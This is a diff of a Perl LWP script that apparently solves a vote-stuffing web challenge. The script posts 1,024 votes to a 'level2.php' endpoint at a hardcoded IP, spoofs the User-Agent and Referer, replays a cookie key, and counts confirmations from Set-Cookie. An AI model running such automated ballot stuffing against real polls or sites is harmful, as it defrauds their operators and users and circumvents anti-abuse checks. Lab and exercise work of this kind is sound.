@@ -13,6 +13,9 @@ use Data::Dump "pp";	# Used to print the request object, if desired.
  * ===--------------------------------------------------------------------------===
 =cut
 
+# LWP is the "Library for WWW in Perl":
+my $ua  = LWP::UserAgent->new();
+
 # Defining the URL:
 my $url = 'http://173.246.108.142/level2.php';
 # Setting the cookie:
@@ -23,26 +26,24 @@ my $params = {
     holdthedoor => 'submit',
     key => $cookie
 };
-# Options for the LWP Constructor:
-my %options = (
-    agent => "Windows NT 100000000000000 (spoofing the User-Agent) havk64 - Perl script requests",
-    timeout => 10
-);
-# LWP is the "Library for WWW in Perl":
-my $ua  = LWP::UserAgent->new(%options);
 # Setting the header:
-$ua->default_header('Referer' => $url);
-$ua->default_header('Cookie' => "HoldTheDoor=$cookie");
+my $headers = HTTP::Headers->new(
+    user_agent => "Windows NT 100000000000000 (spoofing the User-Agent) havk64 - Perl script requests",
+    referer => $url,
+    cookie => "HoldTheDoor=$cookie",
+    timeout => 10,
+);
+$ua->default_headers($headers);
 
-# Optionally print the request header:
-# print pp($ua);
+# Optionally print the request header(great for learning purposes):
+ print pp($ua);
 
 my $counter = 0; # Initializing the voute counter.
 for(my $i = 0; $i < (1 << 10); $i++) {
     my $request = $ua->post($url, $params);
-    
+
     # To print the server headers:
-    # print $request->headers_as_string;
+     print $request->headers_as_string;
     my $check = $request->header('Set-Cookie');
     my $pattern = 'HoldTheDoor';
     if(defined($check) && $check =~ m/$pattern/) { # Using regexp to check if the vote was confirmed.
